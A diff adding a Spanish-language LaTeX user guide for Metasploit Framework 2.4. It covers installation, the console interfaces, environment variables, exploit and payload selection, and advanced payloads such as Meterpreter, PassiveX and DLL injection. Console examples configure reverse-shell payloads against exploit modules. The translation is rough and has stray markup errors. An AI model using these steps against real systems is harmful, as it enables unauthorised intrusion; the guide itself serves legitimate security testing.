@@ -1,0 +1,1004 @@
+%%
+% This file is part of the Metasploit Framework and may be redistributed
+% according to the licenses defined in the Authors field below. In the
+% case of an unknown or missing license, this file defaults to the same
+% license as the core Framework (dual GPLv2 and Artistic). The latest
+% version of the Framework can always be obtained from metasploit.com.
+%%
+
+%
+%   Title: Metasploit Framework Guía Del Usuario
+% Versión: $Revision$
+%
+
+\documentclass{report}
+\usepackage{graphicx}
+\usepackage{color}
+\usepackage{amsmath}
+\usepackage[colorlinks,urlcolor=blue,linkcolor=black,citecolor=blue]{hyperref}
+
+\begin{document}
+
+\title{Metasploit Framework Guía Del Usuario}
+\author{metasploit.com}
+
+\begin{titlepage}
+    \begin{center}
+          
+%\includegraphics[scale=0.6]{images/logo.png} 
+
+        \huge{Metasploit Framework Guía Del Usuario}
+  \ \\[10mm]
+  \large{Versión 2.4}
+  \\[120mm]
+  
+        \small{\url{http://www.metasploit.com/}}
+
+        \rule{10cm}{1pt} \\[4mm]
+        \renewcommand{\arraystretch}{0.5}
+    \end{center}
+\end{titlepage}
+
+\tableofcontents
+
+\setlength{\parindent}{0pt} \setlength{\parskip}{8pt}
+
+
+
+\chapter{Introduction}
+
+\par
+Este documento es un attempto a un guía de Usuario para la versión 2.4 de el 
+Metasploit Framework, la meta es proporcionar una descripción básica, dirigir 
+claramente al usuario de que se trata, cómo funciona y que podemos hacer con
+el esquema (Framework).  cómo la mayoría de proyectos "open-source" la documentación
+toma menos prioridad sobre programación.  Si gustas ayudar al proyecto y tienes 
+talento para la escritura, por favor infórmanos con tus borradores a
+msfdev[at]metasploit.com.
+
+\par
+El Metasploit Framework es un ambiente completo para escribir, probar, y lanzar
+exploit código.  Este ambiente proporciona una plataforma sólida para ejecutar
+pruebas sobre la seguridad de una red privada, escribir "shellcode", o solamente
+para investigar vulnerabilidades.  La mayoría del esquema esta escrito en Perl
+estilo objeto-orientado con componentes opcionales escritos en varios lenguajes
+para incluir: C, Assembler, y Python.  
+
+\par
+El equipo de programadores esta hecho de cuatro miembros por tiempo completo y 
+varios colaboradores.  Por favor refiérase al código de créditos incluido 
+para ver la lista completa de colaboradores.  Si has contribuido al proyecto 
+y no ves tu nombre, por favor infórmanos para corregir el error.
+\par
+\pagebreak
+
+\chapter{Instalación}
+
+    \section{Instalación en Unix}
+    \label{INSTALL-UNIX}
+\par
+Instalar el esquema es tan fácil como descomprimir un archivo de unix "tar",
+cambiarse al directorio propio y ejecutar su usuario de interfaz preferido.
+Les recomendemos sumamente que instalen el paquete Term::ReadLine::Gnu que
+esta incluido en el directorio "extras".  El paquete te dará soporte de
+"tab-completion" cuando utilizas \texttt{msfconsole}; \texttt{msfconsole} es
+la interfaz (UI) que preferimos de día a día.  El Framework soporta cifrado 
+vía "SSL" que esta incluido otra vez en el directorio "extras" para su gusto.
+Por favor refiérase al las apéndices \ref{REF-TAB} y \ref{RES-SSL} si
+gustan leer instrucciones completas.
+
+\par
+Para llevar a cabo una instalación que exista para todo un sistema, es recomendado
+copiar todo el directorio (Framework) a un lugar central para que todos tengan
+acceso por ejemplo en (/usr/local/msf) y crear enlaces de las msf*
+aplicaciónes a (/usr/local/bin).  Si varios usuarios tienen módulos personales,
+los pueden poner en sus directorios privados simplemente en el directorio
+\$HOME/.msf\verb#<#TYPE\verb#\#, el tipo de módulo puede ser de manipulador de 
+sistemas, payloads, nops o encoders.
+
+    \section{Instalación en Windows}
+    \label{INSTALL-WIN32}
+\par
+Después de varios Meses de trabajar en corregir  errores con "ActiveState", al
+fin llegamos a la decisión de soportar únicamente Cygwin Perl.  El instalador
+de Metasploit Framework para la plataforma Win32 incluye una copia de Cygwin
+Perl con un ambiente reducido, este es el método preferido para usar el Framework
+en Windows.  Si gustarías instalar el Framework en un ambiente que contiene Cygwin,
+por favor refiérase al apéndice \ref{CYGWIN}.
+
+   
+    \section{Advertencias de la Plataforma}
+    \label{INSTALL-CAVEAT}
+\par
+Mientras que hemos intentado a soportar todas las plataformas posibles, hemos
+encontrado errores de la compatibilidad que nos han sorprendido.  El soporte
+sobre "raw sockets" actualmente no funciona en Cygwin, AIX, HP-UX, y Solaris.
+Estos errores resultan en habilidades cortas sobre "spoofing" ataques vía UDP
+que normalmente funciona con el "environment variable" \texttt{UdpSourceIp}.
+usuarios de Windows tal ves pueden tener problemas utilizando el Win32 
+instalador en un sistema que contiene otra versión de Cygwin.
+
+    \section{Sistemas Operativos Soportados}
+    \label{INSTALL-SUPPORT}
+\par
+El Framework debe funcionar en cualquier sistema operativo tipo Unix que incluye
+la versión 5.6 o más nueva de Perl.  Cada lanzamiento estable del Framework
+es probado contra estas cuatro plataformas:
+
+\begin{itemize}
+\item Linux (x86, ppc) (2.4, 2.6)
+\item Windows NT (4.0, 2000, XP, 2003)
+\item BSD (Open 3.x, Free 4.6+)
+\item MacOS X (10.3.x)
+\end{itemize}
+
+\par
+Estas plataformas sabemos que son problemáticas:
+\begin{itemize}
+\item Windows 9x (95, 98, ME)
+\item HP-UX 11i (requiere versión más nueva de Perl)
+\end{itemize}
+
+\par
+Hemos recibido varios reportes con acerca de que el Framework funciona bien
+en plataformas cómo Solaris, AIX y hasta en Sharp Zaurus.  Estos sistemas casi
+siempre requieren una versión nueva de Perl junto con varias aplicaciones de
+el proyecto GNU para funcionar bien.
+
+    \section{Manteniendo el Framework al día}
+    \label{INSTALL-UPDATE}
+\par
+Empezando con versión 2.2, el esquema incluye la aplicación msfupdate.
+Esta aplicación ayuda al usuario bajar e instalar la versión más nueva del
+programa del sitio metasploit.com .  La aplicación realiza archivo por archivo
+y compara sumas de comprobación de archivos locales con los de la pagina central
+de Metasploit.  Este proceso ocurre sobre una conexión SSL si contienen el módulo
+"Net::SSLeay".  Este método no es completamente seguro por que depende de la
+seguridad de metasploit.com.  Para familiarizarse más con esta herramienta puedes 
+ejecutar \texttt{msfupdate} con la opción -h.
+
+\par
+Si prefieres no usar la herramienta 'msfupdate', puedes bajar los módulos recientes
+o el Framework completo en estado estable de metasploit.com.  Por el tiempo de 
+esta escritura, \texttt{msfupdate} no soporta el uso sobre "proxy servers".
+\pagebreak
+
+\chapter{Comenzamos}
+
+    \section{El Interfaz de Console}
+    \label{STARTED-CONSOLE}
+\par
+Después de que es instalado el Framework, debe verificar que todo esta 
+trabajando correctamente.  La manera más fácil de hacer esto es ejecutar
+\texttt{msfconsole}.  Este interfaz debe de dibujar una impresión en ascii
+el logo, la versión el sumo de módulos, y dejarte en "msf>" - "msfconsole 
+prompt".  Aqui puedes usar el parámetro \texttt{help} para ver una lista de
+comandos válidos.  Este modo lo llamamos "main"; de aquí puedes ver listas 
+completas de exploits, payloads, o hasta cambiar opciones de configuración
+que afectan el ambiente global de el Framework.  Para listar exploits 
+mecanografíe \texttt{show exploits}.  Para obtener más información de un
+exploit, mecanografíe \texttt{info module\_name}.
+
+\par
+El \texttt{msfconsole} interfaz fue diseñado para ser flexible y eficiente.  Si
+entras y un comando no es reconocido por la consola, explorará el 
+sistema para descubrir si es parte de el Sistema Operativo.  Si lo encuentra
+el comando es ejecutado con los parámetros proporcionados.  Esta característica
+te deja usar tu herramienta común sin tener que abrir o destruir la consola.
+Recomendamos altamente que usen "completar palabra" que esta incluido últimamente
+en el paquete de Windows, pero unos sistemas requieren instalación de otras
+aplicaciones.  Para más información hacia "completar palabra" por favor
+refiérase a el apéndice \ref{REF-TAB}.
+
+\par
+Al ejecutar \texttt{msfconsole} :
+
+\begin{verbatim}
++ -- --=[ msfconsole v2.4 [72 exploits - 75 payloads]
+
+msf > 
+\end{verbatim}
+
+
+    \section{El interfaz - línea de comando}
+    \label{STARTED-CLI}
+\par
+Si buscas otra manera de probar exploit código o para obtener escrituras
+automáticas o simplemente no quieres usar la línea de comando, \textt{msfcli} 
+quizás está es la solución.  Este interfaz toma un parámetro de comparación cómo la 
+primera opción, siguiendo con otras  opciones de forma VAR=VAL, para terminar con
+el ultimo parámetro que defina la acción.  El parámetro de comparación es usado
+sobre la determínese de cual exploit quieres ejecutar, si la comparación 
+contiene más de un resultado - la lista es demostrada.
+
+\par
+El parámetro de acción es solamente una letra; S para un resumen, O para  opciones,
+A para avanzado, C para intentar una revisión de seguridad, y E para lanzar
+un exploit.  Si gustas guardar un ambiente común del interfaz \texttt{msfconsole}
+puedes usar el mismo ambiente de el \texttt{msfcli}.
+
+    \section{El Interfaz Sobre http[s]}
+    \label{STARTED-WEB}
+\par
+El interfaz \texttt{msfweb} es un "web server" completo e independiente que
+te permite aprovecharse de la potencia de el Framework por un browser.  Estos
+son los primeros pasos sobre un interfaz más avanzado, pero tiene buenas
+características por ejemplo; un equipo de "pen-testers" pueden apartar un
+sistema comprometido sobre varios browsers o simplemente para ejecutarlo en
+demostraciones.  SI tienes entendido usar \texttt{msfweb} en Windows, consta que
+Cygwin no soporta "copy-on-write" en aplicaciones que utilizan "fork()".  Esto
+resulta en varias copias completas de la misma aplicación en memoria, últimamente
+usando más que si fuera utilizado \texttt{msfweb} en un ambiente *Nix.
+
+\par
+Empezando con la versión 2.3, \texttt{msfweb} proporciona un ambiente mucho más 
+rápido, y con la habilidad de apartar "shells" sobre varios usuarios.  La consola 
+proporcionado por \texttt{msfweb} fue rigurosamente probado en Firefox 1.0, Internet 
+Explore 6.0, y Safari/Konqueror.
+
+\par
+El \texttt{msfweb} interfaz no proporciona ninguna seguridad cualesquiera; cualquier 
+persona que pueda conectarse al servicio \texttt{msfweb} tiene la oportunidad de 
+compartir al sistema subyacente.  La configuración al instalar es escuchar solo localmente.  
+Si quiere cambiar este defecto utilice la opción -a y el IP de el sistema o use 0.0.0.0 
+para en efecto servir a toda la red local.  Igual al comando de interfaz (cli), el 
+ambiente local es cargado en arranque y puede afectar la configuración del módulo.  
+No te aconsejamos que expongas \texttt{msfweb} sobre una red que no conozcas.
+
+\pagebreak
+\chapter{El Ambiente}
+
+\par
+El ambiente del sistema es un detalle importante del el Framework; las herramientas lo 
+usan para configurar ajustes, los payloads lo usan para componer opcodes, los módulos 
+lo usan para definir parámetros, y es usado por el Framework internamente para pasar 
+opciones de módulo a módulo.  El ambiente del sistema esta lógicamente separado a través 
+de variables en el ambiente temporales y variables en el ambiente global.
+
+\par
+Cada exploit mantiene su propio ambiente temporal, que supersede el ambiente global si 
+es que hay uno.  Cuando seleccionas un exploit vía el comando \texttt{use}, el ambiente 
+para este exploit en particular es cargado y el ambiento de el exploit anterior es 
+ahorrado.  Si cambias de nuevo al anterior, el ambiente anterior es cargado de nuevo.
+
+    \section{El ambiente Global}
+    \label{ENV-GLOBAL}
+
+\par
+El ambiente global puede ser ahorrado o descargado con los \texttt{setg} (ahorrar) o 
+\texttt{unsetg} (descargar).  Lo siguiente es un ejemplo que te demuestra cómo se 
+encuentra el estado del ambiento después de una instalación reciente.  Llamando 
+\texttt{setg} sin opciones te demuestra el ambiente global corriente.  Los ajustes 
+de fábrica son automáticamente cargadas cuando empieza el interfaz.
+
+\begin{verbatim}
+msf > setg
+AlternateExit: 2
+DebugLevel: 0
+Encoder: Msf::Encoder::PexFnstenvMov
+Logging: 0
+Nop: Msf::Nop::Pex
+RandomNops: 1
+\end{verbatim}
+
+
+    \section{El Ambiente Temporal}
+    \label{ENV-TEMP}
+\par
+El ambiente temporal puede ser ahorrado o descargado con los comandos \texttt{set} 
+(ahorrar) o \texttt{unset} (descargar).  Este ambiente solamente aplica al exploit 
+cargado; cambiando de exploit sobre el comando \texttt{use} resulta en ambiente del 
+módulo nuevo.  Si ningún  exploit esta cargado (vía use) los comandos \texttt{set} y 
+\texttt{unset} no se encuentran en la lista reciente de comandos.  Ambientes temporales 
+que no están en uso solamente se encuentran en RAM y son cargados solamente cuando su 
+exploit asociado también es cargado.  Lo siguiente es un ejemplo que te demuestra cómo 
+el comando \texttt{use} selecta un exploit y cómo el comando \texttt{back} invierte a 
+el Framework hasta el modo principal.
+
+\begin{verbatim}
+msf > use wins_ms04_045
+msf wins_ms04_045 > set
+msf wins_ms04_045 > set FOO BAR
+FOO -> BAR
+msf wins_ms04_045 > set
+FOO: BAR
+msf wins_ms04_045 > back
+msf > use openview_omniback
+msf openview_omniback > set RED BLUE
+RED -> BLUE
+msf openview_omniback > set
+RED: BLUE
+msf openview_omniback > back
+msf > use wins_ms04_045
+msf wins_ms04_045 > set
+FOO: BAR
+msf wins_ms04_045 >
+\end{verbatim}
+
+
+    \section{Ambiente Ahorrado}
+    \label{ENV-SAVE} 
+\par
+El comando \texttt{save} puedo ser usado para sincronizar el ambiente Global y el 
+ambiente Temporal al disco local.  El ambiente es colocado a ~/msf/config y es 
+cargado cuando lances cualquier interfaz del Framework.
+
+    \section{Environment Efficiency}
+    \label{ENV-EFF}
+\par
+Este sistema partido del ambiente te permite ahorrar tiempo durante trabajo sobre 
+código de exploits y probando redes por vulnerabilidades.  Las opciones comunes entre 
+los programas se pueden definir en el ambiente Global solamente una vez y cargarse 
+automáticamente para usar con otros módulos.
+
+\par
+El ejemplo debajo te demuestra cómo los ambientes Globales \texttt{LPORT}, \texttt{LHOST}, y
+\texttt{PAYLOAD} pueden ahorrar tiempo cuando ejecuta un par de sistemas con raíces 
+de Windows.  Si este fuera el ambiente corriente y un exploit para Linux es necesario, 
+el ambiente Temporal (vía \texttt{set} y \texttt{unset}) podía ser utilizado para 
+cambiarlos simplemente. 
+
+
+\begin{verbatim}
+msf > setg LPORT 1234
+LPORT -> 1234
+msf > setg LHOST 192.168.0.10 
+LHOST -> 192.168.0.10
+msf > setg PAYLOAD win32_reverse
+PAYLOAD -> win32_reverse
+msf > use apache_chunked_win32 
+msf apache_chunked_win32(win32_reverse) > show options 
+Exploit and Payload Options
+===========================
+
+  Exploit:    Name      Default    Description
+  --------    ------    -------    ------------------    
+  optional    SSL                  Use SSL
+  required    RHOST                The target address
+  required    RPORT     80         The target port
+  
+  Payload:    Name        Default    Description
+  --------    --------    -------    ------------------------------------------    
+  optional    EXITFUNC     seh             Exit technique: "process", "thread", "seh"
+  required    LPORT        123             Local port to receive connection
+  required    LHOST        192.168.0.10    Local address to receive connection
+\end{verbatim}
+
+
+    \section{Variables del Ambiente}
+    \label{ENV-VAR}
+\par
+El ambiente puede ser utilizado para configurar muchos aspectos del Framework, 
+extendiéndose de los ajustes del interfaz usuario a opciones para medir el tiempo 
+que esperamos una conexión sobre la red vía el API.  Esta sección describe las 
+variables del ambiente más comunas.
+
+\par 
+Para un listado completo de todas las variables del ambiente, por favor vea el 
+archivo Environment.txt en el directorio "docs" del Framework.
+
+ \subsection{DebugLevel}
+\par
+Esta variable es usada para ajustar el verbosity que los mensajes proporcionaron 
+acerca de los componentes del Framework.  Ajustando esta variable a 0 prevendrá la 
+impresión de estos mensajes en tu pantalla.  El Framework soporta de 0 a 5 ajustes 
+para conveniencia.
+
+ \subsection{Logging}
+\par
+Esta variable es usada para permitir o negar la información registrada de la sesión.  
+La información de cada sesión es guardada en el directorio ~/.msflogs de fábrica, la 
+variable \texttt{LogDir} en el ambiente se puede cambiar para ajustar el directorio.  
+Para revisar la información notada puedes usar la herramienta \texttt{msflogdump}.
+
+ \subsection{LogDir}
+\par
+Esta opción especifica en qué directorio se deben guardar la información anotada por 
+el Framework.  La variable de fábrica es ~/.msf/logs.  El archivo msfconsole.log 
+gravara cada acción de el interfaz en uso.  Empezando con versión 2.4, el interfaz 
+\texttt{msfconsole} interfaz gravara cuando empieza, termina, y que comandos fueron 
+ejecutados en el sistema.  Un archivo de información nuevo es creado con cada ejecución 
+acertada de un exploit.
+
+ \subsection{Encoder}
+\par
+Esta variable puede ser ajustada con un listado de tus Encoders separados por comas.  
+El Framework le dará preferencia a los encoders en la lista en orden o continuará 
+sobre el resto de Encoders.
+
+\begin{verbatim}
+msf> set Encoder ShikataGaNai
+\end{verbatim}
+
+ \subsection{EncoderDontFallThrough}
+\par
+Esta opción le indica al Framework que no continúe con el resto de los Encoders si 
+la lista de preferencia no tiene éxito.  Esto es útil para mantener sus exploits sin 
+que alarmen al la red que estas atacando por que tu Encoder preferido fallo.
+
+ \subsection{Nop}
+\par
+Esto tiene el mismo comportamiento que la entrada del Encoder hacia arriba, pero en 
+lugar de ser Encoders son Nops preferidos.  Los generadores de Nops pueden ser alistados 
+con el comando \texttt{show nops}.
+
+\begin{verbatim}
+msf> set Nop Opty
+\end{verbatim}
+
+ \subsection{NopDontFallThrough}
+\par
+Esta opción \texttt{EncoderDontFallThrough} tiene el mismo carácter, pero aplica 
+solamente a el listado de Nops.
+
+ \subsection{RandomNops}
+\par
+Esta opción permite que el trineo de nops seleccionados al azar sean utilizados en vez 
+del estándar opcode.  RandomNops es un módulo estable y debe de trabajar con todos los 
+exploits contenidos en el Framework.  El módulo RandomNops no soporta la generación al 
+azar de todas las arquitecturas.
+
+ \subsection{ConnectTimeout}
+\par
+Esta opción permite que especifiques el tiempo que espera la conexión TCP para una 
+respuesta alejada.  Este ajuste viene puesto a diez por fábrica, pero lo pueden cambiar 
+a su gusto.
+
+ \subsection{RecvTimeout}
+\par
+Esta opción especifica el máximo número de segundos tenidos en cuenta para esperar 
+trafico en una 'socket' que fue ajustada al número especial de -1.  Esta opción 
+puede ser ajustada para más o menos que -1, dependiendo de la necesidad de el curso 
+sobre la red.  Si la red que llamas usa una conexión lenta puede causar problemas 
+si la opción no es ajustada propiamente arriba de -1.
+
+ \subsection{RecvTimeoutLoop}
+\par
+Esta opción especifica el máximo número de segundos tenidos en cuenta para esperar 
+trafico en una 'socket' antes de rechace.  Cada vez que reciben trafico dentro de 
+este período, el lazo comienza otra vez.  Si la red que llamas usa una conexión 
+lenta puede causar problemas si la opción no es ajustada propiamente.
+
+ \subsection{Proxies}
+\par
+Este ambiente fortalece todas las 'TCP sockets' que pasen por una cadena de 'proxies' 
+especificadas.  El formato de las cadenas es tipo:sistema:puerto para cada proxy 
+separada por comas.  Esta versión incluye soporte a socks4 y http tipo de proxies.
+
+ \subsection{ForceSSL}
+\par
+Este ambiente fortalece todas las 'TCP sockets' que negocien el protocol de SSL.  
+Esto tiene uso cuando un módulo que no vienen con acceso a la opción \texttt{SSL}.
+
+ \subsection{UdpSourceIp}
+\par
+Esta variable del ambiente se usa para controlar IP address del sistema local que es 
+usado para enviar trafico por una red.  Esta opción tiene uso cuando el exploit código 
+es basado en UDP cómo ... (MSSQL, ISS, etc).  Esta opción depende en poder abrir una 
+'raw socket', algo que normalmente solamente el usuario root o un administrante.  Este 
+ajuste no funciona en Windows por el ambiente de Cygwin.
+
+ \subsection{NinjaHost}
+\par
+Esta variable puede ser usada para desviar todo el trafico para una server conteniendo 
+la herramienta 'socketNinja.pl' activada.  El valor de este ajuste debe de ser el IP 
+de el sistema que contiene el console de socketNinja (perl socketNinja.pl -d).
+
+ \subsection{NinjaPort}
+\par
+Esta variable puede ser usada en conjunto con NinjaHost para desviar todo el trafico 
+a un sistema conteniendo la aplicación socketNinja.  El valor del ajuste debe de ser 
+el número de puerto del socketNinja console.
+
+ \subsection{NinjaDontKill}
+\par
+Esta opción puede ser usada para ejecutar un exploit a varios sistemas a la vez, y 
+tiene muy buen uso cuando atacas sistemas sobre UDP y lo directas a un 'broadcast 
+address' de una red. (ej. 1.2.3.255)
+
+ \subsection{Salida Alternativa}
+\par
+Esta opción es un arreglo de un error que esta presente en varias versiones de Perl 
+que causan un Segmentación fault' el tiempo de excito.  Si te encuentras este problema 
+con \texttt{msfconsole} solamente ajusta esta opción a 2.
+ 
+\pagebreak
+
+\chapter{Usando el Framework}
+
+ \section{Escogiendo un Exploit Módulo}
+\par
+Del interfaz \texttt{msfconsole}, puedes ver todos los módulos que se encuentran usando 
+el comando \texttt{show exploits}.  Escoger un exploit usando el comando \texttt{use} y 
+el nombre del exploit módulo de tu gusto.  Si necesitas más información sobre un módulo 
+usa el comando \texttt{info}.
+
+	\section{Ajustando el Exploit Módulo Activo}
+\par
+Des pues que escojas el módulo de tu gusto, tienes que determinar cuales opciones son 
+necesarias.  El comando \texttt{show options} te demuestra todas las opciones que el 
+módulo requiere.  La mayoría de módulos usan \texttt{RHOST} para ajustar el sistema 
+victima, y \texttt{RPORT} para ajustar el puerto.  opciones más avanzadas se encuentran 
+en varios exploits; estas opciones pueden ser demuéstralas utilizando el comando 
+\texttt{show advanced}.  Usa el comando \texttt{set} para configurar los valores propios 
+de todas las opciones que el módulo requiere.  Si tienes preguntas sobre que hace un 
+exploit solamente refiere al código del módulo localizado en el directorio 'exploits' 
+del Framework.
+
+	\section{Verificando las opciones de un Exploit}
+\par
+El comando \texttt{check} se encuentra en varios exploits, y permite que pruebes un 
+sistema victima sobre el estado de una vulnerabilidad.  Este comando es una manera 
+rápida de probar un sistema, o solamente asegurarte que ajustaste todas las opciones 
+propiamente.  El comando \texttt{check} no debe de permitir que al ejecutar un exploit 
+el sistema alejado resulte dañado o que no funciona. Varios módulos solamente atienen 
+la versión del sistema alejado y esperan que tu hagas la decisión sobre la vulnerabilidad.
+
+	\section{Seleccionando un Victima}
+\par
+Varios exploits requieren el variable \texttt{TARGET} ajustado en el ambiente al numero 
+del índice, del blanco deseada.  El comando \texttt{show targets} demuestra un listado 
+de todas las targets que el exploit contiene.  Algunos módulos vienen ajustados con 
+esta variable lista para ejecutar un ataque a tipo 'brute-force', pero esta opción no 
+es deseada en todas ocasiones.
+
+ \section{Seleccionando el Payload}
+\par
+
+Payload es código que es ejecutado cuando un exploit es lanzado contra un sistema y el 
+atento es valido.  El comando \texttt{show payloads} demuestra el listado completo de 
+payloads o solamente los que correspondan a el exploit cargado.  Si estas detrás de una 
+firewall, debes de usar un payload comparado a 'bind shell'; si el victima esta detrás 
+de una firewall y tu no, puedes usar un 'reverse connect' payload.  El comando 
+\texttt{info payload\_name} te dará información sobre el payload que gustes.
+ 
+\par
+Si estas listo para cargar el payload de tu gusto, el comando \texttt{set} para ajustar 
+el variable \texttt{PAYLOAD}.  Des pues de ajustar el payload correcto, puedes usar el 
+comando \texttt{show options} para ver las opciones que son necesarias.  La mayoría de 
+payloads tienen una opción requerida.  Para ver las opciones avanzadas puedes usar el 
+comando \texttt{show advanced}.  Deben de notar que el Framework no
+tiene reglas estrictas para ajustar las opciones de los exploits.  Por ejemplo, cuando 
+escojas un linux payload y quieres atacar un sistema BSD lógicamente el atempto va a 
+fallar y el módulo no te dará aviso.
+
+
+ \section{Lanzando un Exploit}
+\par
+El comando  \texttt{exploit} lanza un ataque.  Si funciona, tu payload ejecuta y 
+probablemente te data
+una shell en el sistema victimo.
+
+\pagebreak
+\chapter{Característicos Avanzados}
+
+\par
+Esta sección cubre varios característicos que se encuentran en esta versión del 
+Framework.  Estos característicos pueden ser usados con cualquier exploit y iluminan
+el valor y flexibilidad de un Framework para lanzar exploits.
+
+\section{El Meterpreter}
+\par
+Meterpreter es un payload avanzado que tiene varias funciones que pueden ser extendidas, 
+ejecutadas y lanzadas a cualquier tiempo.  En forma simple, es una shell que de permite 
+agregar más opciones o característicos fácilmente.  Para más información sobre los detalles 
+de Meterpreter por favor de referirse al manual.  El manual se encuentra en el directorio 
+"docs" del Framework o en la pagina de Metasploit:
+
+\url{http://metasploit.com/projects/Framework/docs/meterpreter.pdf}
+
+\section{PassiveX Payloads}
+\par
+Empezando con la versión 2.4 del Framework tienen la opción de cargar cualquier código 
+ActiveX que gusten a una aplicación victima.  Esta opción simplemente ajusta la 'registry' 
+del sistema victimo causando que la aplicación atacada lance una instancia de Internet 
+Explorer con a URL del Framework.  El Framework laza una web server que acepta conexiones 
+y responde una pagina que contiene un componente de ActiveX.  El sistema del victima luego 
+baja y ejecuta el componente ActiveX por la aplicación Internet Explorer.
+
+\par
+El payload básico de PassiveX \texttt{win32\_passivex}, soporta cualquier código ActiveX 
+que programes.  En el Framework vienen incluidos tres más PassiveX módulos.  Estos módulos 
+pueden te permiten ejecutar una shell, cargar el módulo Meterpreter, o inyectar código 
+directamente a memoria (por ejemplo código que lanza VNC).  El payload PassiveX 
+\texttt{win32\_passivex}, soporta cualquier ActiveX componente.  Además del payload 
+original, agregamos tres más módulos incluidos en el Framework.  Estos módulos pueden 
+ser usados para ejecutar una shell, cargar el Meterpreter módulo o lanzar el servicio de 
+VNC.  Cuando alguno de estos tres payloads es usado, el objeto de PassiveX emula una 
+conexión TCP sobre peticiones de HTTP GET y POST.  Emulación de esta manera te permite 
+utilizar tu shell, VNC o el interfaz de Meterpreter sobre las conexiones básicas de HTTP.
+
+\par
+cómo PassiveX utiliza Internet Explorer para cargar el componente de ActiveX, hereda 
+todos los ajustes que fueron configurados por el victima.  Este es preferido cuando la 
+red privada que estas atacando utiliza una web proxy que requiere autorización.  El sistema 
+PassiveX incluido en el Framework 2.4 requiere que la victima tenga Internet Explorer 6.0 o 
+mayor instalado.  Para más información sobre PassiveX por favor refiérase al articulo 
+publicado en Uniformed llamado "Post-Exploitation on Windows using ActiveX Controls" 
+localizado:
+
+\url{http://www.uninformed.org/?v=1&a=3&t=pdf}
+
+\section{InlineEgg Python Payloads}
+\par
+El código InlineEgg es una clase escrita en Python para generar programas en
+assembly.  El usuario más común de este código es para rápidamente crear exploit
+payloads más avanzados.  Este código fue escrito por Gera para la aplicación de
+la compañía Core ST.  Core lanzo este producto al publico con licencia que permite al 
+Framework utilizar el código libremente.
+
+\par
+El Metasploit Framework soporta InlineEgg payloads por el módulo ExternalPayload; esto
+permite que el Framework utiliza InlineEgg payloads de fábrica si el sistema local 
+contiene la aplicación Python instalada.  Para utilizar InlineEgg payloads solamente 
+ajusta el variable \texttt{EnablePython} en el ambiente a un numero arriba de 0.  
+Empezando con versión 2.4 la aplicación Python no es incluida en el paquete de 
+instalación para Windows. 
+
+\par
+Esta versión incluye ejemplos para utilizar InlineEgg en Linux, BSD, y Windows.  Los 
+ejemplos para Linux son \texttt{linux\_ia32\_reverse\_ie}, \texttt{linux\_ia32\_bind\_ie}, 
+y \texttt{linux\_ia32\_reverse\_xor}.  Estos payloads pueden ser seleccionados y 
+utilizados en la misma manera que cualquier otro payload.  El cuerpo de los payloads 
+son lentamente construidos por las aplicaciones escritas en Python localizadas en el 
+directorio "payloads/external".  Los payloads para BSD funcionan igual que los módulos 
+para Linux.
+
+\par
+El ejemplo para Windows es \texttt{win32\_reverse\_stg\_ie} y funciona un poco diferente.  
+El payload tiene una opción nombrada \texttt{IEGG}, esta opción especifica el 'path' para 
+la aplicación InlineEgg que contiene el ultimo payload.  Este payload se divide en tres 
+etapas, la primera es 'reverse connect', la segunda enviá el address de GetProcAddress y 
+LoadLibraryA sobre la conexión, y la tercer es generada localmente y enviada sobre la red.  
+El programa incluido InlineEgg se encuentra en el directorio payloads/external llamado 
+\texttt{win32\_stg\_winexec.py}.  Para obtener más información sobre InlineEgg, favor 
+refieran al website de Gera:
+
+\url{http://community.corest.com/~gera/ProgrammingPearls/InlineEgg.html}
+
+######################
+\section{Impurity ELF Injection}
+\par
+Impurity es un concepto desarrollado por Alexander Cuttergo que describió un método
+de cargar y ejecutar un programa ELF dentro memoria.  Este método permite que escribas
+cualquier payload que gustes en C, solamente requiere un payload especial llamado 
+\texttt{linux_\ia32\_reverse\_impurity} ajustado con la opción PEXEC.  PEXEC debe de ser
+ajustado al ELF payload que escribiste.
+
+
+\par
+Impurity módulos tienen que ser compilados con unas opciones especiales documentadas en el
+directorio src/impurity o en el documento QUICKSTART.impurity localizado en el directorio 
+"docs".  Este documento contiene un ejemplo utilizando el payload "shelldemo" que te permite
+ejecutar varios programas dentro de otras aplicaciones.  La aplicación "shelldemo" contiene
+código para abrir file handles, cambiar permisos, usuarios o hasta te da acceso a los permisos
+del sistema de archivos.  El archivo del sujeto esta archivado en una lista en:
+
+\url{http://archives.neohapsis.com/archives/vuln-dev/2003-q4/0006.html}
+
+
+\section{Proxies en Cadenas}
+\par
+El Framework incluye soporte para TCP proxies; esta versión contiene  rutinas para
+utilizar proxies sobre HTTP CONNECT, y SOCKSv4.  Para usar una proxy con un módulo, el
+comando \texttt{Proxies} tiene que ser ajustado en el ambiente.  Se puede encadenar varias
+proxies con comas solamente tienen que mecanografiarlos en formato tipo:host:puerto; done el
+tipo es uno de estas selecciones: 'http' para HTTP CONNECT proxies, o 'socks4' para tipo
+SOCKS v4.  EL listado no tiene limite; el Framework e pasado pruebas con hasta 500 proxies
+a la vez.  Algo que deben de saber es que únicamente cubrimos la conexión del exploit con
+proxies, la conexión para el payload (la conexión después de lazar el exploit) no esta protegida. 
+
+\section{Win32 UploadExec Payloads}
+\par
+Aunque sistemas tipo Unix normalmente incluyen todas las herramientas que son preferidas des
+pues de lanzar un exploit, sistemas de Windows contienen lo opuesto.  La opción 'UploadExec' 
+incluida en esta versión te permite enviar tus herramientas favoritas, y ejecutarla todo sobre
+la misma conexión que fue usada por el payload.  Cuando combines este motivo con un 'rootkit'
+o lenguaje de escritura (scripting language), esta opción puede ser mucho muy efectiva.  Payloads
+para el módulo Meterpreter son mejor para este tipo de ataque pero es importante tener opciones.
+
+\section{Win32 DLL Injection Payloads}
+\par
+Empezando con versión 2.2, el Framework incluye un 'staged payload' que te tiene la habilidad de
+inyectar un DLL de tu gusto directamente a memoria con cualquier exploit tipo para Win32 
+incluido en el Framework.  Este payload no escribe nada al sistema de archivos, el DLL es lanzado
+en un 'thread' nueve dentro de la aplicación atacada.  Este payload fue inventado por Jarkko
+Turkulainen y Matt Miller y es una de las métodos más efectivos de esta era.  Para escribir un DLL 
+que puede ser utilizado por este payload, solamente tienen que contener un método 'Init' que toma
+una opción, el valor numero del 'socket descriptor' que lleva la conexión del payload.  El método
+Init se convierte en la función de entrada para el thread nuevo en la aplicación atacada.  Para 
+más información hacia Win32 DLL Injection por favor refiérase al documento encontrado en el 
+directorio src/shellcode/win32/dllinject.
+
+\section{VNC Server DLL Injection}
+\par
